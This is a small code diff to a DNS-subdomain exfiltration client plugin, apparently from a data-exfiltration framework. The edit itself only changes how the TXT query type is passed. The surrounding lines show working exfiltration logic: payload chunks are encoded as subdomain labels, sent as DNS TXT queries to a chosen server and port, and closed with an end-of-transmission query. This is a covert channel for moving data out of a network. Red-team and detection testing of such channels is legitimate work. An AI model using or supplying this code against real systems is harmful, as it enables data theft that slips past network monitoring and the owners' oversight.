@@ -17,9 +17,9 @@ class DnsClientSubdomain(ExfilClientPlugin):
         try:
             for label in chunk_labels(payload_iter):
                 qname = f"{label}.{exfil_id}.{root}."
-                q = DNSRecord.question(qname, qtype=QTYPE.TXT)
+                q = DNSRecord.question(qname, qtype="TXT")
                 sock.sendto(q.pack(), (server, port)); sent += 1
-            q = DNSRecord.question(f"EOT.{exfil_id}.{root}.", qtype=QTYPE.TXT)
+            q = DNSRecord.question(f"EOT.{exfil_id}.{root}.", qtype="TXT")
             sock.sendto(q.pack(), (server, port)); sent += 1
             return {"ok": True, "queries": sent}
         finally:
